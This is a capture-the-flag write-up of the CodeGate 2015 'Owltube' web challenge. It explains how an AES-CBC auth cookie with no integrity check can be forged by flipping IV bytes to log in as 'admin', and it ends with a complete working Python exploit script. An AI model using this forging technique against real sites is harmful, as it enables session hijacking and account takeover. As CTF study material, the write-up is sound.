# CodeGate General (preliminaries) CTF 2015: Owltube

**Category:** Web
**Points:** 400
**Description:** 

> You're welcome to betatest our new social media site, it's going to be the next big thing.
> 
> Server : http://54.64.164.100:5555/
> Script : [http://binary.grayhash.com/2a0182588cf5550cebb49876d94c7a2f/index.py](index.py)
> 
> - option : please check the notice board.

## Write-up

The challenge consists of a python Tornado web application using mongodb and allows users to register, login and add links to youtube videos.
User sessions are managed through an authentication cookie that is constructed as follows:

>```python
>def set_cookie(resp, cookie):
>	cookie = json.dumps(cookie)
>
>	iv = Random.new().read(BS)
>	aes = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
>	cookie = pad(cookie)
>	cookie = iv + aes.encrypt(cookie)
>	cookie = cookie.encode("base64")
>	cookie = cookie.replace("\n", "")
>
>	resp.set_cookie("auth", cookie)
>```

The cookie value passed to set_cookie is set, upon successful login, to a json representation of the following dictionary:

>```python
>	u = {}
>	u["u"] = request.form.get("user")
>	u["pw"] = request.form.get("pw")
>```

The vulnerability here resides in the fact that the cookie is encrypted using AES in Cipher Block Chaining (CBC) mode. In CBC mode, each block of plaintext is XORed to the previous block of ciphertext before being encrypted, using a random IV for the first block of plaintext. Conversely, upon decryption, each block of ciphertext is decrypted and subsequently XORed to the previous block of ciphertext (or the IV in case of the first block) to yield the final decrypted block.

![alt cbc_decryption](cbc_decryption.png)

Since CBC mode comes with no authentication mechanism (eg. a MAC, signature, etc.) the application has no means to detect if the encrypted data it processes has been altered or not by a malicious client. This allows us to perform a bitflipping attack on our encrypted cookie. Flipping a byte in a ciphertext block will corrupt the corresponding decrypted block but produce a corresponding flip in the byte at the same block-offset within the subsequent block. Hence, given a known plaintext byte at offset i in the plaintext, we can alter the byte at offset i in the final decryption result by flipping byte (i-block_size) of the ciphertext (or byte i of the IV if i < block_size).

Since the decryption result must always be a valid json string, we cannot afford corrupting the ciphertext itself and hence are restricted to flipping the first 16 bytes of the plaintext by corrupting the IV only. We can set bytes at offsets 0..15 in the decryption result to our target text by corrupting the IV in the following manner:

>``python
>iv[i] = chr(ord(known_plaintext[i]) ^ ord(iv[i]) ^ ord(target_text[i]))
>```

This, of course, requires known plaintext for at least the first 16 bytes. If we register a user, we know the full plaintext of the cookie:

>```python
>{"u": "username", "pw": "password"}
>```

In the application source we can see the following code for the index:

>```python
>def index():
>	if is_logged_in():
>		videos = []
>		for i, vid in enumerate(g.db.videos.find({"user": g.user["u"]})):
>```

We will try to construct a cookie with a plaintext that allows us to achieve successful login as the user "admin" (which we guessed to be the target account for flag retrieval, since it was the only username always taken while the rest of the usernames were periodically wiped from the database). If we register a user with username "x" and password "admin", our known plaintext will be:

>```python
>{"u": "x", "pw": "admin"}
>```

We want to flip this to the following in order to eliminate the "pw" field so we can achieve successfull login:

>```python
>{"u":  "x", "u": "admin"}
>```


The [final exploit](solution/owltube_exploit.py) is as follows:

>```python
>#!/usr/bin/python
>#
># CODEGATE General CTF 2015
># OWLTUBE (WEB/400) Exploit
>#
># @a: Smoke Leet Everyday
># @u: https://github.com/smokeleeteveryday
>#
>
>import requests
>from Crypto.Cipher import AES
>
>BS = AES.block_size
>
>class exploit:
>	def __init__(self):
>		self.r = None
>		self.cookies = None
>		return
>
>	def getAuthcookie(self):
>		if(self.cookies):
>			return self.cookies['auth']
>		else:
>			return None
>
>	def login(self, url, username, password):
>		payload = {'user': username, 'pw': password}
>		self.r = requests.post(url + '/login', data=payload)
>		self.cookies = self.r.cookies
>		return
>
>	def register(self, url, username, password, email):
>		payload = {'user': username, 'pw': password, 'email': email}
>		self.r = requests.post(url + '/register', data=payload)
>		self.cookies = self.r.cookies
>		return
>
>	def visit(self, url, authcookie):
>		cookie = {'auth': authcookie}
>		self.r = requests.get(url, cookies=cookie)
>		return (self.r.text, self.r.status_code)
>
>email = "x@x"
>username = "x"
>password = "admin"
>
>url = 'http://54.64.164.100:5555'
>
>sploit = exploit()
>
>sploit.register(url, username, password, email)
>sploit.login(url, username, password)
>
>cookie = sploit.getAuthcookie()
>(iv, e) = (cookie.decode('base64')[:BS], cookie.decode('base64')[BS:])
>
>print "[+]Cookie: [%s]" % cookie
>print "[+]IV: [%s]" % iv.encode('hex')
>print "[+]Ciphertext: [%s]" % e.encode('hex')
>
>plaintext = '{"u": "x", "pw": "admin"}'
>targetext = '{"u":  "x", "u": "admin"}'
>
>iv2 = list(iv)
>for i in range(0, 16):
>	iv2[i] = chr(ord(plaintext[i]) ^ ord(iv2[i]) ^ ord(targetext[i]))
>
>iv2 = "".join(iv2)
>
>cookie = (iv2 + e).encode("base64").replace("\n", "")
>
>(t, s) = sploit.visit(url, cookie)
>
>print t
>```